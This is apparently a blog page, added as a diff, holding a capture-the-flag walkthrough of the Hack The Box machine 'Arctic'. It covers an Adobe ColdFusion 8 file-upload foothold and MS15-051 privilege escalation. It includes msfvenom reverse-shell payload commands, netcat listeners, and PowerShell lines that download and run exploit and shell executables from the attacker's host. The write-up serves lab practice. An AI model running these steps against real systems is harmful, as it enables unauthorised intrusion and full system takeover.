@@ -1,0 +1,81 @@
+<html>
+<head>
+	<title>HTB: Arctic</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="/CSS/blog.css">
+	<link rel="stylesheet" href="/CSS/global.css">
+</head>
+<body class="noselect">
+	<h1 id="title" class="blog_title">
+		<a href="/index.html" class="homelink">
+			HTB: Arctic
+		</a>
+		
+	</h1>
+	<div id="big_wrapper" class="wordwrap">
+		<div class="paragraph">
+			<div id="menu">
+				<a href="/index.html" class="menu_item">Home</a>
+				<a href="/Blogs/TLDR/htb_arctic.html" class="menu_item">TLDR</a>
+				<a href="/Blogs/index.html" class="menu_item">All Blogs</a>
+				<a href="/Blogs/resources.html" class="menu_item">Resources</a>
+				<hr>
+			</div>
+		</div>
+
+<div class="paragraph">
+	<p None class="subtitle">Intro:</p>
+<p class="content">This box was rated a 2.2/5.... Probably because the webserver took a literal 30 seconds to load a page -_-. Anyways, once we understand that port 8500 is a webport the foothold is straightforwards, and we can privesc into system through a kernel-mode driver exploit.</p>
+</div>
+<div class="paragraph">
+	<p None class="subtitle">Recon:</p>
+<p class="content">Running nmap gives us three ports, two of which are a collective one rabbit hole: <span class="code">nmap -sT -sV -A -v &lt;ip&gt;</span> reveals ports [135,8500,49154]. Port 135 is MSRPC Endpoint Mapper, which tells connecting devices what services are mapped to which port. Port 49154 is in the range of ports that the MSRPC Mapper assigns services to. This is confirmed through enumerating the endpoints using an impacket script "rpcdump.py" <a href="#ref_1" class="link">[1]</a>.</p>
+<p class="content">Port 8500 is a non-standard port, so we'll need to do some digging to discover what it is. Nmap says it's possibly running "FMTP", which is warily confirmed by a quick googling. We will come back to this port later.</p>
+</div>
+<div class="paragraph">
+	<p None class="subtitle">Hunting the Rabbit:</p>
+<p class="content">rpcdump.py returns a lot of information, which I'm dumping <a href="#ref_2" class="link">here</a>. Sifting through it all, we see that port 49154 is mapped to "Task Scheduler Service Remoting Protocol". Some research on this port shows us that we can possibly execute commands through this service.</p>
+<div class="image imgzoom"><img src="./Pics/task.png"><p class="imgsub">rpcdump.py output showing Task Scheduler</p></div>
+<p class="content">After hours of me trying to figure out how to connect to this port, I ultimately accept failure. In most cases this would be quite bad, but I remembered that there is one more port, so I decide to give it another shot. The whole box can't be one huge rabbit hole!</p>
+</div>
+<div class="paragraph">
+	<p None class="subtitle">Getting User:</p>
+<p class="content">I decide to google the port one more time. Digging aroung brings me to an interesting discovery: Port 8500 is the default web server for Adobe ColdFusion. I typed the url:port into Firefox and after waiting 30 seconds we get a webpage! It's a login page for Adobe ColdFusion. We can try some default credentials with no luck. Exploit time! Doing a bit of googling shows us that we are able to do an arbitrary file upload via a specific POST request. There are two exploits on Exploit DB that we can analyze to achieve the exploit anti-metasploit. One of them is an example POST request, and the other is a metasploit script. I've used the metasploit module as a framework, and the POST example as a guide to understand what exactly the metasploit module is doing (I'm no ruby pro, but it's getting there!).</p>
+<div class="image imgzoom"><img src="./Pics/metasploit_exploit.png"><p class="imgsub">Metasploit module's payload</p></div>
+<p class="content">We see that the module sends a POST request to "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm", while passing url query parameters: "Command=FileUpload&Type=File&CurrentFolder=/#{page}%00".The #{page} we will replace with whatever we want to name the payload. Something to note is the server will lock up if you try to upload a file with a name that already exists. We are sending a multi-part form which requires a boundary. We set ours to an arbitrary "---647913258". One of the data parts is filled with: <span class="code">form-data; name="newfile"; filename="arbitrary.txt"</span>. Checking the other exploit we see that this is the "Content-Disposition" header. Finally, it passes the payload, which we can generate using msfvenom: <span class="code">msfvenom -p windows/x64/shell_reverse_tcp -f jsp LHOST=&lt;your ip&gt; LPORT=3184 &gt; cmd.jsp</span>. I've been unsuccessful with getting a PowerShell reverse shell, so a cmd shell will do for now. One header to be mindful of is the "Content-Length" header, which is the byte-length of the entire body. Our script manages to add some extra bytes to the payload, but is still successful with our reverse shell. I've written this all into a python script <a href="#ref_3" class="link">[3]</a>. The reply should be a cool "HTTP/1.0 200 OK" and you can verify success by navigating to: <span class="code">http://&lt;target ip&gt;:8500/userfiles/file</span>, where you should see the jsp file we just uploaded. This honestly took waaaay longer to get working than I was hoping, but in the end I got it and now I have a template tool to reference!</p>
+<div class="image"><img src="./Pics/uploads.png"><p class="imgsub">A couple test uploads</p></div>
+<p class="content">Once the file is uploaded, start a netcat listener and navigate to the file: <span class="code_block"><br>nc -lvp 3184<br>
+filepath: http://&lt;target ip&gt;:8500/userfiles/file/cmd.jsp</span><br>Get that user flag! <span class="code">type C:\Users\tolis\Desktop\user.txt</span></p>
+</div>
+<div class="paragraph">
+	<p None class="subtitle">Getting Root:</p>
+<p class="content">To get root we need to do some vuln enumeration. First, we can get a PowerShell using a oneliner: <span class="code">powershell -Command '&lt;one-liner&gt;'</span> <a href="#ref_4" class="link">[4]</a>. Start a new netcal listener and now we're running PowerShell baby! Navigate to "C:\Users\tolis\AppData\Local\Temp" so we can download files. We're gonna go with the Sherlock PowerShell script because this is an older machine (Windows Server 2008, no hotfixes). I hadn't had any luck with <span class="code">Invoke-WebRequest</span>, so we manually create an object from which we can download Sherlock: <span class="code_block"><br>$WebClient=New-Object System.Net.WebClient<br>
+$WebClient.DownloadFile("http://&lt;your ip&gt;/path/to/Sherlock.ps1","C:\Users\tolis\AppData\Local\Temp\"s.ps1")</span><br>Run the script, then run <span class="code">Find-AllVulns</span>. This will list all the vulnerabilities that may affect our target. We will go with the MS15-051 exploit.</p>
+<div class="image"><img src="./Pics/sherlock.png"><p class="imgsub">Sherlock showing us our target is vunlerable to MS15-051</p></div>
+<p class="content">Download the exploit from the SecWiki github <a href="#ref_5" class="link">[5]</a> and upload it: <span class="code">$WebClient.DownloadFile("http://&lt;your ip","C:\Users\tolis\AppData\Local\Temp\ms.exe")</span>. To confirm it works, we can run <span class="code">.\ms.exe 'whoami'</span> which will return "nt authority/system".</p>
+<p class="content">Finally, to get a root shell, we can upload yet another PowerShell reverse shell (courtesy of msfvenom) and listen for it: <span class="code_block"><br>msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=&lt;your ip&gt; LPORT=3188 &gt; rshl.exe<br>
+python -m http.server &<br>
+nc -lvp 3188</span><br>On the target: <span class="code_block"><br>$WebClient.DownloadFile("http://&lt;your ip&gt;:8000/rshl.exe","C:\Users\tolis\AppData\Local\Temp\rshl.exe")<br>
+.\ms.exe .\rshl.exe</span><br>Yay! We get the connection and have a system shell! <span class="code">type C:\Users\Administrator\Desktop\root.txt</span> for the root flag!</p>
+<div class="image"><img src="./Pics/root.png"><p class="imgsub">Running our final reverse shell</p></div>
+</div>
+<br><br><br><div class="paragraph res_list">
+	<p class="subtitle">Resources:</p>
+<p class="content"><a id="ref_1" href="/Blogs/resources.html#tool_impacket" class="menu_item">Impacket</a></p><br>
+<p class="content"><a id="ref_2" href="./Files/rpcdump.txt" class="menu_item" target="_blank">rpcdump.txt</a>&nbsp<b>[FILE]</b></p><br>
+<p class="content"><a id="ref_3" href="/Blogs/resources.html#custom_htb_arctic_afu" class="menu_item">Adobe ColdFusion 8 AFU</a></p><br>
+<p class="content"><a id="ref_4" href="/Blogs/resources.html#rshell_powershell_oneliner_generic" class="menu_item">Powershell One-Liner</a></p><br>
+<p class="content"><a id="ref_5" href="https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip" class="menu_item" target="_blank">SecWiki MS15-051 exploit</a>&nbsp<b>[EXTERNAL]</b></p><br>
+</div>
+		<br>
+		<div class="paragraph">
+			<hr>
+			<p class="content">Last edit: 2021.09.04</p>
+		</div>
+	</div>
+</body>
+<footer>
+	<script type="text/javascript" src="/JS/blog.js"></script>
+</footer>
+</html>
